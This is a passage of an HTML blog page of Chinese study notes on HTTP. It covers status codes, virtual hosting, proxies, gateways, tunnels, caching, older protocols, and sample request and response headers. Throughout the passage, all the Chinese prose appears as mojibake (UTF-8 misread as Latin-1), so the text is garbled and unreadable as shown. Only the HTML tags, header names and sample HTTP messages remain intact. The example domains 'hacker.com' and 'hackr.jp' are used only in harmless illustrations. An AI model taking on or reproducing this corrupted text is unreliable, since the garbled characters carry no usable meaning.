class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å†…å®¹åå•†æŠ€æœ¯</p><ul><li>æœåŠ¡å™¨é©±åŠ¨åå•†</li><li>å®¢æˆ·ç«¯é©±åŠ¨åå•†</li><li>é€æ˜åå•†</li></ul><h2 id="HTTPè¿”å›çŠ¶æ€ç "><a href="#HTTPè¿”å›çŠ¶æ€ç " class="headerlink" title="HTTPè¿”å›çŠ¶æ€ç "></a>HTTPè¿”å›çŠ¶æ€ç </h2><h3 id="ç±»åˆ«"><a href="#ç±»åˆ«" class="headerlink" title="ç±»åˆ«"></a>ç±»åˆ«</h3><p><img src="https://z3.ax1x.com/2021/04/12/c0oHzj.png" alt="c0oHzj.png"></p><h4 id="2XX"><a href="#2XX" class="headerlink" title="2XX"></a>2XX</h4><p>2XX çš„å“åº”ç»“æœè¡¨æ˜è¯·æ±‚è¢«æ­£å¸¸å¤„ç†äº†</p><h5 id="200OK"><a href="#200OK" class="headerlink" title="200OK"></a>200OK</h5><p>è¡¨ç¤ºä»å®¢æˆ·ç«¯å‘æ¥çš„è¯·æ±‚åœ¨æœåŠ¡å™¨ç«¯è¢«æ­£å¸¸å¤„ç†äº†ï¼Œgetè¯·æ±‚å›è¿”å›å®ä½“ï¼Œheadè¯·æ±‚è¿”å›å®ä½“é¦–éƒ¨</p><h5 id="204-No-Content"><a href="#204-No-Content" class="headerlink" title="204 No Content"></a>204 No Content</h5><p>è¯¥çŠ¶æ€ç ä»£è¡¨æœåŠ¡å™¨æ¥æ”¶çš„è¯·æ±‚å·²æˆåŠŸå¤„ç†ï¼Œä½†åœ¨è¿”å›çš„å“åº”æŠ¥æ–‡ä¸­ä¸å«å®ä½“çš„ä¸»ä½“éƒ¨åˆ†ã€‚ï¼ˆæµè§ˆå™¨ä¸æ›´æ–°é¡µé¢ï¼‰</p><h5 id="206-Partial-Content"><a href="#206-Partial-Content" class="headerlink" title="206 Partial Content"></a>206 Partial Content</h5><p>è¯¥çŠ¶æ€ç è¡¨ç¤ºå®¢æˆ·ç«¯è¿›è¡Œäº†èŒƒå›´è¯·æ±‚ï¼Œè€ŒæœåŠ¡å™¨æˆåŠŸæ‰§è¡Œäº†è¿™éƒ¨åˆ†çš„GET è¯·æ±‚ã€‚å“åº”æŠ¥æ–‡ä¸­åŒ…å«ç”± Content-Range æŒ‡å®šèŒƒå›´çš„å®ä½“å†…å®¹ã€‚</p><h4 id="3XXé‡å®šå‘"><a href="#3XXé‡å®šå‘" class="headerlink" title="3XXé‡å®šå‘"></a>3XXé‡å®šå‘</h4><p>3XX å“åº”ç»“æœè¡¨æ˜æµè§ˆå™¨éœ€è¦æ‰§è¡ŒæŸäº›ç‰¹æ®Šçš„å¤„ç†ä»¥æ­£ç¡®å¤„ç†è¯·æ±‚ã€‚</p><h5 id="301-Moved-Permanently"><a href="#301-Moved-Permanently" class="headerlink" title="301 Moved Permanently"></a>301 Moved Permanently</h5><p>æ°¸ä¹…æ€§é‡å®šå‘ã€‚è¯¥çŠ¶æ€ç è¡¨ç¤ºè¯·æ±‚çš„èµ„æºå·²è¢«åˆ†é…äº†æ–°çš„ URIï¼Œä»¥ååº”ä½¿ç”¨èµ„æºç°åœ¨æ‰€æŒ‡çš„ URIã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœå·²ç»æŠŠèµ„æºå¯¹åº”çš„ URIä¿å­˜ä¸ºä¹¦ç­¾äº†ï¼Œè¿™æ—¶åº”è¯¥æŒ‰ Location é¦–éƒ¨å­—æ®µæç¤ºçš„ URI é‡æ–°ä¿å­˜ã€‚</p><h5 id="302-Found"><a href="#302-Found" class="headerlink" title="302 Found"></a>302 Found</h5><p>ä¸´æ—¶æ€§é‡å®šå‘ã€‚è¯¥çŠ¶æ€ç è¡¨ç¤ºè¯·æ±‚çš„èµ„æºå·²è¢«åˆ†é…äº†æ–°çš„ URIï¼Œå¸Œæœ›ç”¨æˆ·ï¼ˆæœ¬æ¬¡ï¼‰èƒ½ä½¿ç”¨æ–°çš„ URI è®¿é—®ã€‚ä¸æ›´æ–°ä¹¦ç­¾ï¼Œä»ä¿ç•™äº§ç”Ÿ302çš„url</p><h5 id="303-See-Other"><a href="#303-See-Other" class="headerlink" title="303 See Other"></a>303 See Other</h5><p>è¯¥çŠ¶æ€ç è¡¨ç¤ºç”±äºè¯·æ±‚å¯¹åº”çš„èµ„æºå­˜åœ¨ç€å¦ä¸€ä¸ª URIï¼Œåº”ä½¿ç”¨ GETæ–¹æ³•å®šå‘è·å–è¯·æ±‚çš„èµ„æºã€‚ä¾‹å¦‚ï¼Œpostæ–¹æ³•è¯·æ±‚æ—¶ï¼Œå¤„ç†ç»“æœå¸Œæœ›å®¢æœç«¯é‡‡ç”¨getæ–¹æ³•è·å–èµ„æº</p><h5 id="304-Not-Modified"><a href="#304-Not-Modified" class="headerlink" title="304 Not Modified"></a>304 Not Modified</h5><p>è¯¥çŠ¶æ€ç è¡¨ç¤ºå®¢æˆ·ç«¯å‘é€é™„å¸¦æ¡ä»¶çš„è¯·æ±‚æ—¶ï¼ŒæœåŠ¡å™¨ç«¯å…è®¸è¯·æ±‚è®¿é—®èµ„æºï¼Œä½†æœªæ»¡è¶³æ¡ä»¶çš„æƒ…å†µã€‚304 çŠ¶æ€ç è¿”å›æ—¶ï¼Œä¸åŒ…å«ä»»ä½•å“åº”çš„ä¸»ä½“éƒ¨åˆ†ã€‚</p><p>é™„å¸¦æ¡ä»¶çš„è¯·æ±‚æ˜¯æŒ‡é‡‡ç”¨ GETæ–¹æ³•çš„è¯·æ±‚æŠ¥æ–‡ä¸­åŒ…å« If-Matchï¼ŒIf-Modified-Sinceï¼ŒIf-None-Matchï¼ŒIf-Rangeï¼ŒIf-Unmodified-Since ä¸­ä»»ä¸€é¦–éƒ¨ã€‚</p><h5 id="307-Temporary-Redirect"><a href="#307-Temporary-Redirect" class="headerlink" title="307 Temporary Redirect"></a>307 Temporary Redirect</h5><h4 id="4XX-å®¢æˆ·ç«¯é”™è¯¯"><a href="#4XX-å®¢æˆ·ç«¯é”™è¯¯" class="headerlink" title="4XX å®¢æˆ·ç«¯é”™è¯¯"></a>4XX å®¢æˆ·ç«¯é”™è¯¯</h4><p>4XX çš„å“åº”ç»“æœè¡¨æ˜å®¢æˆ·ç«¯æ˜¯å‘ç”Ÿé”™è¯¯çš„åŸå› æ‰€åœ¨ã€‚</p><h5 id="400-Bad-Request"><a href="#400-Bad-Request" class="headerlink" title="400 Bad Request"></a>400 Bad Request</h5><p>è¯¥çŠ¶æ€ç è¡¨ç¤ºè¯·æ±‚æŠ¥æ–‡ä¸­å­˜åœ¨è¯­æ³•é”™è¯¯ã€‚ä¿®æ”¹æŠ¥æ–‡å†å‘é€ã€‚å’Œ200å¼‚æ›²åŒå·¥</p><h5 id="401-Unauthorized"><a href="#401-Unauthorized" class="headerlink" title="401 Unauthorized"></a>401 Unauthorized</h5><p>è¯¥çŠ¶æ€ç è¡¨ç¤ºå‘é€çš„è¯·æ±‚éœ€è¦æœ‰é€šè¿‡ HTTP è®¤è¯ï¼ˆBASIC è®¤è¯ã€DIGEST è®¤è¯ï¼‰çš„è®¤è¯ä¿¡æ¯ã€‚</p><p>è¿”å›å«æœ‰ 401 çš„å“åº”å¿…é¡»åŒ…å«ä¸€ä¸ªé€‚ç”¨äºè¢«è¯·æ±‚èµ„æºçš„ WWW-Authenticate é¦–éƒ¨ç”¨ä»¥è´¨è¯¢ï¼ˆchallengeï¼‰ç”¨æˆ·ä¿¡æ¯ã€‚</p><p>é¦–æ¬¡è¿”å›ä¸€ä¸ªè®¤è¯æ¡†ï¼Œå†è¿”å›å°±æ˜¯è®¤è¯å¤±è´¥</p><h5 id="403-Forbidden"><a href="#403-Forbidden" class="headerlink" title="403 Forbidden"></a>403 Forbidden</h5><p>è¯¥çŠ¶æ€ç è¡¨æ˜å¯¹è¯·æ±‚èµ„æºçš„è®¿é—®è¢«æœåŠ¡å™¨æ‹’ç»äº†ã€‚</p><h5 id="404-Not-Found"><a href="#404-Not-Found" class="headerlink" title="404 Not Found"></a>404 Not Found</h5><p>è¯¥çŠ¶æ€ç è¡¨æ˜æœåŠ¡å™¨ä¸Šæ— æ³•æ‰¾åˆ°è¯·æ±‚çš„èµ„æºã€‚é™¤æ­¤ä¹‹å¤–ï¼Œä¹Ÿå¯ä»¥åœ¨æœåŠ¡å™¨ç«¯æ‹’ç»è¯·æ±‚ä¸”ä¸æƒ³è¯´æ˜ç†ç”±æ—¶ä½¿ç”¨ã€‚</p><h4 id="5XX-æœåŠ¡å™¨é”™è¯¯"><a href="#5XX-æœåŠ¡å™¨é”™è¯¯" class="headerlink" title="5XX æœåŠ¡å™¨é”™è¯¯"></a>5XX æœåŠ¡å™¨é”™è¯¯</h4><p>5XX çš„å“åº”ç»“æœè¡¨æ˜æœåŠ¡å™¨æœ¬èº«å‘ç”Ÿé”™è¯¯ã€‚</p><h5 id="500-Internal-Server-Error"><a href="#500-Internal-Server-Error" class="headerlink" title="500 Internal Server Error"></a>500 Internal Server Error</h5><p>è¯¥çŠ¶æ€ç è¡¨æ˜æœåŠ¡å™¨ç«¯åœ¨æ‰§è¡Œè¯·æ±‚æ—¶å‘ç”Ÿäº†é”™è¯¯ã€‚ä¹Ÿæœ‰å¯èƒ½æ˜¯ Webåº”ç”¨å­˜åœ¨çš„ bug æˆ–æŸäº›ä¸´æ—¶çš„æ•…éšœã€‚</p><h5 id="503-Service-Unavailable"><a href="#503-Service-Unavailable" class="headerlink" title="503 Service Unavailable"></a>503 Service Unavailable</h5><p>è¯¥çŠ¶æ€ç è¡¨æ˜æœåŠ¡å™¨æš‚æ—¶å¤„äºè¶…è´Ÿè½½æˆ–æ­£åœ¨è¿›è¡Œåœæœºç»´æŠ¤ï¼Œç°åœ¨æ— æ³•å¤„ç†è¯·æ±‚ã€‚</p><h3 id="samll-tips"><a href="#samll-tips" class="headerlink" title="samll_tips"></a>samll_tips</h3><p>ä¸å°‘è¿”å›çš„çŠ¶æ€ç å“åº”éƒ½æ˜¯é”™è¯¯çš„ï¼Œä½†æ˜¯ç”¨æˆ·å¯èƒ½å¯Ÿè§‰ä¸åˆ°è¿™ç‚¹ã€‚</p><h2 id="ä¸-HTTP-åä½œçš„-Web-æœåŠ¡å™¨"><a href="#ä¸-HTTP-åä½œçš„-Web-æœåŠ¡å™¨" class="headerlink" title="ä¸ HTTP åä½œçš„ Web æœåŠ¡å™¨"></a>ä¸ HTTP åä½œçš„ Web æœåŠ¡å™¨</h2><h3 id="ç”¨å•å°è™šæ‹Ÿä¸»æœºå®ç°å¤šä¸ªåŸŸå"><a href="#ç”¨å•å°è™šæ‹Ÿä¸»æœºå®ç°å¤šä¸ªåŸŸå" class="headerlink" title="ç”¨å•å°è™šæ‹Ÿä¸»æœºå®ç°å¤šä¸ªåŸŸå"></a>ç”¨å•å°è™šæ‹Ÿä¸»æœºå®ç°å¤šä¸ªåŸŸå</h3><p>ä¸€å°æœåŠ¡å™¨æ‰˜ç®¡äº†ä¸¤ä¸ªåŸŸåï¼Œ<a href="http://www.hacker.com,www.hacker2.com,ä¸¤ä¸ªåŸŸåæ‰˜ç®¡åœ¨ä¸€ä¸ªè™šæ‹Ÿæœº,åˆ™dnsè§£æåipç›¸åŒ,ä¸¤ä¸ªåŸŸåä¼šè®¿é—®ä¸€ä¸ªip.åœ¨ç›¸åŒçš„/">www.hacker.com,www.hacker2.comï¼Œä¸¤ä¸ªåŸŸåæ‰˜ç®¡åœ¨ä¸€ä¸ªè™šæ‹Ÿæœºï¼Œåˆ™DNSè§£æåIPç›¸åŒï¼Œä¸¤ä¸ªåŸŸåä¼šè®¿é—®ä¸€ä¸ªIPã€‚åœ¨ç›¸åŒçš„</a> IP åœ°å€ä¸‹ï¼Œç”±äºè™šæ‹Ÿä¸»æœºå¯ä»¥å¯„å­˜å¤šä¸ªä¸åŒä¸»æœºåå’ŒåŸŸåçš„ Web ç½‘ç«™ï¼Œå› æ­¤åœ¨å‘é€ HTTP è¯·æ±‚æ—¶ï¼Œå¿…é¡»åœ¨ Host é¦–éƒ¨å†…å®Œæ•´æŒ‡å®šä¸»æœºåæˆ–åŸŸåçš„ URIã€‚</p><h3 id="é€šä¿¡æ•°æ®è½¬å‘ç¨‹åº-ï¼šä»£ç†ã€ç½‘å…³ã€éš§é“"><a href="#é€šä¿¡æ•°æ®è½¬å‘ç¨‹åº-ï¼šä»£ç†ã€ç½‘å…³ã€éš§é“" class="headerlink" title="é€šä¿¡æ•°æ®è½¬å‘ç¨‹åº ï¼šä»£ç†ã€ç½‘å…³ã€éš§é“"></a>é€šä¿¡æ•°æ®è½¬å‘ç¨‹åº ï¼šä»£ç†ã€ç½‘å…³ã€éš§é“</h3><h4 id="ä»£ç†"><a href="#ä»£ç†" class="headerlink" title="ä»£ç†"></a>ä»£ç†</h4><p>ä»£ç†æ˜¯ä¸€ç§æœ‰è½¬å‘åŠŸèƒ½çš„åº”ç”¨ç¨‹åºï¼Œå®ƒæ‰®æ¼”äº†ä½äºæœåŠ¡å™¨å’Œå®¢æˆ·ç«¯â€œä¸­é—´äººâ€çš„è§’è‰²ï¼Œæ¥æ”¶ç”±å®¢æˆ·ç«¯å‘é€çš„è¯·æ±‚å¹¶è½¬å‘ç»™æœåŠ¡å™¨ï¼ŒåŒæ—¶ä¹Ÿæ¥æ”¶æœåŠ¡å™¨è¿”å›çš„å“åº”å¹¶è½¬å‘ç»™å®¢æˆ·ç«¯ã€‚</p><p>ä»£ç†æœåŠ¡å™¨çš„åŸºæœ¬è¡Œä¸ºå°±æ˜¯æ¥æ”¶å®¢æˆ·ç«¯å‘é€çš„è¯·æ±‚åè½¬å‘ç»™å…¶ä»–æœåŠ¡å™¨ã€‚ä»£ç†ä¸æ”¹å˜è¯·æ±‚ URIï¼Œä¼šç›´æ¥å‘é€ç»™å‰æ–¹æŒæœ‰èµ„æºçš„ç›®æ ‡æœåŠ¡å™¨ã€‚</p><p><img src="https://z3.ax1x.com/2021/04/20/cT5HG8.png" alt="cT5HG8.png"></p><p>æ¯æ¬¡é€šè¿‡ä»£ç†æœåŠ¡å™¨è½¬å‘è¯·æ±‚æˆ–å“åº”æ—¶ï¼Œä¼šè¿½åŠ å†™å…¥ Via é¦–éƒ¨ä¿¡æ¯</p><h5 id="ä»£ç†æ–¹æ³•"><a href="#ä»£ç†æ–¹æ³•" class="headerlink" title="ä»£ç†æ–¹æ³•"></a>ä»£ç†æ–¹æ³•</h5><p>1.ç¼“å­˜ä»£ç†</p><p>ä»£ç†è½¬å‘å“åº”æ—¶ï¼Œç¼“å­˜ä»£ç†ï¼ˆCaching Proxyï¼‰ä¼šé¢„å…ˆå°†èµ„æºçš„å‰¯æœ¬ï¼ˆç¼“å­˜ï¼‰ä¿å­˜åœ¨ä»£ç†æœåŠ¡å™¨ä¸Šã€‚å†æ¬¡æ”¶åˆ°ç›¸åŒçš„èµ„æºè¯·æ±‚å°±ä¼šè¿”å›ä»£ç†ä¸Šç¼“å­˜çš„èµ„æºã€‚</p><p>2.é€æ˜ä»£ç†</p><p>è½¬å‘è¯·æ±‚æˆ–å“åº”æ—¶ï¼Œä¸å¯¹æŠ¥æ–‡åšä»»ä½•åŠ å·¥çš„ä»£ç†ç±»å‹è¢«ç§°ä¸ºé€æ˜ä»£ç†ï¼ˆTransparent Proxyï¼‰ã€‚åä¹‹ï¼Œå¯¹æŠ¥æ–‡å†…å®¹è¿›è¡ŒåŠ å·¥çš„ä»£ç†è¢«ç§°ä¸ºéé€æ˜ä»£ç†ã€‚</p><h4 id="ç½‘å…³"><a href="#ç½‘å…³" class="headerlink" title="ç½‘å…³"></a>ç½‘å…³</h4><p>ç½‘å…³æ˜¯è½¬å‘å…¶ä»–æœåŠ¡å™¨é€šä¿¡æ•°æ®çš„æœåŠ¡å™¨ï¼Œæ¥æ”¶ä»å®¢æˆ·ç«¯å‘é€æ¥çš„è¯·æ±‚æ—¶ï¼Œå®ƒå°±åƒè‡ªå·±æ‹¥æœ‰èµ„æºçš„æºæœåŠ¡å™¨ä¸€æ ·å¯¹è¯·æ±‚è¿›è¡Œå¤„ç†ã€‚æœ‰æ—¶å®¢æˆ·ç«¯å¯èƒ½éƒ½ä¸ä¼šå¯Ÿè§‰ï¼Œè‡ªå·±çš„é€šä¿¡ç›®æ ‡æ˜¯ä¸€ä¸ªç½‘å…³ã€‚</p><p>ç½‘å…³çš„å·¥ä½œæœºåˆ¶å’Œä»£ç†ååˆ†ç›¸ä¼¼ã€‚è€Œç½‘å…³èƒ½ä½¿é€šä¿¡çº¿è·¯ä¸Šçš„æœåŠ¡å™¨æä¾›é HTTP åè®®æœåŠ¡ã€‚<br>åˆ©ç”¨ç½‘å…³èƒ½æé«˜é€šä¿¡çš„å®‰å…¨æ€§ï¼Œå› ä¸ºå¯ä»¥åœ¨å®¢æˆ·ç«¯ä¸ç½‘å…³ä¹‹é—´çš„é€šä¿¡çº¿è·¯ä¸ŠåŠ å¯†ä»¥ç¡®ä¿è¿æ¥çš„å®‰å…¨ã€‚</p><p><img src="https://z3.ax1x.com/2021/04/20/cT5qxg.png" alt="cT5qxg.png"></p><h4 id="éš§é“"><a href="#éš§é“" class="headerlink" title="éš§é“"></a>éš§é“</h4><p>éš§é“æ˜¯åœ¨ç›¸éš”ç”šè¿œçš„å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¸¤è€…ä¹‹é—´è¿›è¡Œä¸­è½¬ï¼Œå¹¶ä¿æŒåŒæ–¹é€šä¿¡è¿æ¥çš„åº”ç”¨ç¨‹åºã€‚</p><p>éš§é“å¯æŒ‰è¦æ±‚å»ºç«‹èµ·ä¸€æ¡ä¸å…¶ä»–æœåŠ¡å™¨çš„é€šä¿¡çº¿è·¯ï¼Œå±Šæ—¶ä½¿ç”¨ SSLç­‰åŠ å¯†æ‰‹æ®µè¿›è¡Œé€šä¿¡ã€‚éš§é“çš„ç›®çš„æ˜¯ç¡®ä¿å®¢æˆ·ç«¯èƒ½ä¸æœåŠ¡å™¨è¿›è¡Œå®‰å…¨çš„é€šä¿¡ã€‚<br>éš§é“æœ¬èº«ä¸ä¼šå»è§£æ HTTP è¯·æ±‚ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œè¯·æ±‚ä¿æŒåŸæ ·ä¸­è½¬ç»™ä¹‹åçš„æœåŠ¡å™¨ã€‚</p><p><img src="https://z3.ax1x.com/2021/04/20/cT5OMQ.png" alt="cT5OMQ.png"></p><h3 id="ä¿å­˜èµ„æºçš„ç¼“å­˜"><a href="#ä¿å­˜èµ„æºçš„ç¼“å­˜" class="headerlink" title="ä¿å­˜èµ„æºçš„ç¼“å­˜"></a>ä¿å­˜èµ„æºçš„ç¼“å­˜</h3><p>ç¼“å­˜æœåŠ¡å™¨çš„ä¼˜åŠ¿åœ¨äºåˆ©ç”¨ç¼“å­˜å¯é¿å…å¤šæ¬¡ä»æºæœåŠ¡å™¨è½¬å‘èµ„æºã€‚å› æ­¤å®¢æˆ·ç«¯å¯å°±è¿‘ä»ç¼“å­˜æœåŠ¡å™¨ä¸Šè·å–èµ„æºï¼Œè€ŒæºæœåŠ¡å™¨ä¹Ÿä¸å¿…å¤šæ¬¡å¤„ç†ç›¸åŒçš„è¯·æ±‚äº†ã€‚</p><h4 id="ç¼“å­˜çš„æœ‰æ•ˆæœŸé™"><a href="#ç¼“å­˜çš„æœ‰æ•ˆæœŸé™" class="headerlink" title="ç¼“å­˜çš„æœ‰æ•ˆæœŸé™"></a>ç¼“å­˜çš„æœ‰æ•ˆæœŸé™</h4><p>å³ä½¿å­˜åœ¨ç¼“å­˜ï¼Œä¹Ÿä¼šå› ä¸ºå®¢æˆ·ç«¯çš„è¦æ±‚ã€ç¼“å­˜çš„æœ‰æ•ˆæœŸç­‰å› ç´ ï¼Œå‘æºæœåŠ¡å™¨ç¡®è®¤èµ„æºçš„æœ‰æ•ˆæ€§ã€‚è‹¥åˆ¤æ–­ç¼“å­˜å¤±æ•ˆï¼Œç¼“å­˜æœåŠ¡å™¨å°†ä¼šå†æ¬¡ä»æºæœåŠ¡å™¨ä¸Šè·å–â€œæ–°â€èµ„æºã€‚</p><h4 id="å®¢æˆ·ç«¯çš„ç¼“å­˜"><a href="#å®¢æˆ·ç«¯çš„ç¼“å­˜" class="headerlink" title="å®¢æˆ·ç«¯çš„ç¼“å­˜"></a>å®¢æˆ·ç«¯çš„ç¼“å­˜</h4><p>ç¼“å­˜ä¸ä»…å¯ä»¥å­˜åœ¨äºç¼“å­˜æœåŠ¡å™¨å†…ï¼Œè¿˜å¯ä»¥å­˜åœ¨å®¢æˆ·ç«¯æµè§ˆå™¨ä¸­ã€‚ä»¥Internet Explorer ç¨‹åºä¸ºä¾‹ï¼ŒæŠŠå®¢æˆ·ç«¯ç¼“å­˜ç§°ä¸ºä¸´æ—¶ç½‘ç»œæ–‡ä»¶ï¼ˆTemporary Internet Fileï¼‰ã€‚<br>æµè§ˆå™¨ç¼“å­˜å¦‚æœæœ‰æ•ˆï¼Œå°±ä¸å¿…å†å‘æœåŠ¡å™¨è¯·æ±‚ç›¸åŒçš„èµ„æºäº†ï¼Œå¯ä»¥ç›´æ¥ä»æœ¬åœ°ç£ç›˜å†…è¯»å–ã€‚</p><h3 id="HTTP-å‡ºç°ä¹‹å‰çš„åè®®"><a href="#HTTP-å‡ºç°ä¹‹å‰çš„åè®®" class="headerlink" title="HTTP å‡ºç°ä¹‹å‰çš„åè®®"></a>HTTP å‡ºç°ä¹‹å‰çš„åè®®</h3><ol><li>FTPï¼ˆFile Transfer Protocolï¼‰<br>ä¼ è¾“æ–‡ä»¶æ—¶ä½¿ç”¨çš„åè®®ã€‚</li><li>NNTPï¼ˆNetwork News Transfer Protocolï¼‰<br>ç”¨äº NetNews ç”µå­ä¼šè®®å®¤å†…ä¼ é€æ¶ˆæ¯çš„åè®®ã€‚ã€‚</li><li>Archie<br>æœç´¢ anonymous FTP å…¬å¼€çš„æ–‡ä»¶ä¿¡æ¯çš„åè®®ã€‚</li><li>WAISï¼ˆWide Area Information Serversï¼‰<br>ä»¥å…³é”®è¯æ£€ç´¢å¤šä¸ªæ•°æ®åº“ä½¿ç”¨çš„åè®®ã€‚</li><li>Gopher<br>æŸ¥æ‰¾ä¸äº’è”ç½‘è¿æ¥çš„è®¡ç®—æœºå†…ä¿¡æ¯çš„åè®®ã€‚</li></ol><h2 id="HTTP-é¦–éƒ¨"><a href="#HTTP-é¦–éƒ¨" class="headerlink" title="HTTP é¦–éƒ¨"></a>HTTP é¦–éƒ¨</h2><h3 id="HTTP-æŠ¥æ–‡é¦–éƒ¨"><a href="#HTTP-æŠ¥æ–‡é¦–éƒ¨" class="headerlink" title="HTTP æŠ¥æ–‡é¦–éƒ¨"></a>HTTP æŠ¥æ–‡é¦–éƒ¨</h3><p><img src="https://z3.ax1x.com/2021/04/20/cT5Xrj.png" alt="cT5Xrj.png"></p><p>HTTP åè®®çš„è¯·æ±‚å’Œå“åº”æŠ¥æ–‡ä¸­å¿…å®šåŒ…å« HTTP é¦–éƒ¨ã€‚é¦–éƒ¨å†…å®¹ä¸ºå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨åˆ†åˆ«å¤„ç†è¯·æ±‚å’Œå“åº”æä¾›æ‰€éœ€è¦çš„ä¿¡æ¯ã€‚</p><h4 id="HTTP-è¯·æ±‚æŠ¥æ–‡"><a href="#HTTP-è¯·æ±‚æŠ¥æ–‡" class="headerlink" title="HTTP è¯·æ±‚æŠ¥æ–‡"></a>HTTP è¯·æ±‚æŠ¥æ–‡</h4><p><img src="https://z3.ax1x.com/2021/04/20/cT5xZn.png" alt="cT5xZn.png"></p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">hackr.jp</span></span><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0</span></span><span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,</span></span>*/*; q=0.8<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">ja,en-us;q=0.7,en;q=0.3</span></span><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span><span class="token header"><span class="token header-name keyword">DNT</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">keep-alive</span></span><span class="token header"><span class="token header-name keyword">If-Modified-Since</span><span class="token punctuation">:</span> <span class="token header-value">Fri, 31 Aug 2007 02:02:20 GMT</span></span><span class="token header"><span class="token header-name keyword">If-None-Match</span><span class="token punctuation">:</span> <span class="token header-value">"45bae1-16a-46d776ac"</span></span><span class="token header"><span class="token header-name keyword">Cache-Control</span><span class="token punctuation">:</span> <span class="token header-value">max-age=0</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="HTTP-å“åº”æŠ¥æ–‡"><a href="#HTTP-å“åº”æŠ¥æ–‡" class="headerlink" title="HTTP å“åº”æŠ¥æ–‡"></a>HTTP å“åº”æŠ¥æ–‡</h4><p><img src="https://z3.ax1x.com/2021/04/20/cT5zaq.png" alt="cT5zaq.png"></p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">304</span> <span class="token reason-phrase string">Not Modified</span></span><span class="token header"><span class="token header-name keyword">Date</span><span class="token punctuation">:</span> <span class="token header-value">Thu, 07 Jun 2012 07:21:36 GMT</span></span><span class="token header"><span class="token header-name keyword">Server</span><span class="token punctuation">:</span> <span class="token header-value">Apache</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span class="token header"><span class="token header-name keyword">Etag</span><span class="token punctuation">:</span> <span class="token header-value">"45bae1-16a-46d776ac"</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="HTTP-é¦–éƒ¨å­—æ®µ"><a href="#HTTP-é¦–éƒ¨å­—æ®µ" class="headerlink" title="HTTP é¦–éƒ¨å­—æ®µ"></a>HTTP é¦–éƒ¨å­—æ®µ</h3><h4 id="HTTP-é¦–éƒ¨å­—æ®µä¼ é€’é‡è¦ä¿¡æ¯"><a href="#HTTP-é¦–éƒ¨å­—æ®µä¼ é€’é‡è¦ä¿¡æ¯" class="headerlink" title="HTTP é¦–éƒ¨å­—æ®µä¼ é€’é‡è¦ä¿¡æ¯"></a>HTTP é¦–éƒ¨å­—æ®µä¼ é€’é‡è¦ä¿¡æ¯</h4><h4 id="HTTP-é¦–éƒ¨å­—æ®µç»“æ„"><a href="#HTTP-é¦–éƒ¨å­—æ®µç»“æ„" class="headerlink" title="HTTP é¦–éƒ¨å­—æ®µç»“æ„"></a>HTTP é¦–éƒ¨å­—æ®µç»“æ„</h4><p>HTTP é¦–éƒ¨å­—æ®µæ˜¯ç”±é¦–éƒ¨å­—æ®µåå’Œå­—æ®µå€¼æ„æˆçš„</p><pre class="line-numbers language-http" data-language="http"><code class="language-http">é¦–éƒ¨å­—æ®µå: å­—æ®µå€¼<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">text/html</span></span><span class="token header"><span class="token header-name keyword">Keep-Alive</span><span class="token punctuation">:</span> <span class="token header-value">timeout=15, max=100</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>è‹¥ <strong>HTTP</strong> é¦–éƒ¨å­—æ®µé‡å¤äº†ä¼šå¦‚ä½•</p><p> ä¸åŒæµè§ˆå™¨è§£ææ–¹å¼ä¸åŒï¼Œæœ‰çš„æ˜¯è§£æå‰é¢ï¼Œæœ‰çš„åˆ™æ˜¯è§£æåé¢çš„</p><h4 id="4-ç§-HTTP-é¦–éƒ¨å­—æ®µç±»å‹"><a href="#4-ç§-HTTP-é¦–éƒ¨å­—æ®µç±»å‹" class="headerlink" title="4 ç§ HTTP é¦–éƒ¨å­—æ®µç±»å‹"></a><strong>4</strong> ç§ <strong>HTTP</strong> é¦–éƒ¨å­—æ®µç±»å‹</h4><ol><li>é€šç”¨é¦–éƒ¨å­—æ®µï¼ˆ<strong>General</strong> <strong>Header Fields</strong>ï¼‰</li></ol><p>è¯·æ±‚æŠ¥æ–‡å’Œå“åº”æŠ¥æ–‡ä¸¤æ–¹éƒ½ä¼šä½¿ç”¨çš„é¦–éƒ¨ã€‚</p><ol start="2"><li>è¯·æ±‚é¦–éƒ¨å­—æ®µï¼ˆ<strong>Request Header Fields</strong>ï¼‰</li></ol><p>ä»å®¢æˆ·ç«¯å‘æœåŠ¡å™¨ç«¯å‘é€è¯·æ±‚æŠ¥æ–‡æ—¶ä½¿ç”¨çš„é¦–éƒ¨ã€‚è¡¥å……äº†è¯·æ±‚çš„é™„åŠ å†…å®¹ã€å®¢æˆ·ç«¯ä¿¡æ¯ã€å“åº”å†…å®¹ç›¸å…³ä¼˜å…ˆçº§ç­‰ä¿¡æ¯ã€‚</p><ol start="3"><li>å“åº”é¦–éƒ¨å­—æ®µï¼ˆ<strong>Response Header 